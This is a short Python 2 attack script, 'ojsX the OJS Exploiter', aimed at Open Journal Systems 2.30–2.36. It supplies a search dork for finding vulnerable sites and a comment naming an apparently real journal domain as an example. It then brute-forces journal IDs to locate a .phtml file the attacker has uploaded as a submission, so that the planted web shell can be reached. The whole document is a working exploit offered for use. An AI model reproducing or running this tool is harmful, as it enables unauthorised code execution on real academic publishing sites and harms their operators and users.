#!/usr/bin/python2.7

import requests
from time import sleep

version = "0.1"

print "ojsX the OJS Exploiter"
print "v%s by Vanciel" % version

print "[-] Dork : inurl:/index.php/index/user/register"
print "[!] This exploit only works with OJS version 2.30-2.36"
print "[!] You must upload a submission file to the site in order to make this exploit works"

print "\n[-] The full url of the ojs vulnerable website. (Ex : http://www.vulnjs.com)"
url 	 = raw_input("    URL      : ")
print "[-] The name of your phtml file that you've uploaded (Ex : 1-1-1-SM.phtml)"
filename = raw_input("    Filename : ")
article_id = filename.split("-")[0]
# fullurl = "http://ejs.epoka.edu.al/files/journals/{journal_id}/artciles/{articleid}/submission/original/{filename}" % (url,articleid,filename)

journal_id = 1

print "\n[-] Starting Exploitation..."

while(True):
	print "[-] Trying to exploit journal_id=" + str(journal_id)
	full_url = url + "/files/journals/"+ str(journal_id) +"/articles/"+ article_id +"/submission/original/" + filename
	try:
		r = requests.get(full_url)
	except:
		print "[!] Can't connect to the host. It seems you have a bad connection :("
		print "[-] Retrying to connect...(Hit CTRL-C to stop)\n"
		sleep(3)
		continue
	if(r.status_code != 404):
		print "[+] Exploitation success!"
		print "[+] Full URL : " + full_url
		exit()
	elif(journal_id % 50 == 0):
		q = raw_input("[-] It seems the website isn't vulnerable. Do you want to keep searching ? (y/n) ")
		if(q == "n"):
			print "Goodbye!"
			exit()
	else:
		print "[!] Can't find the right path :( Retrying...\n"
		
	journal_id = journal_id + 1
	
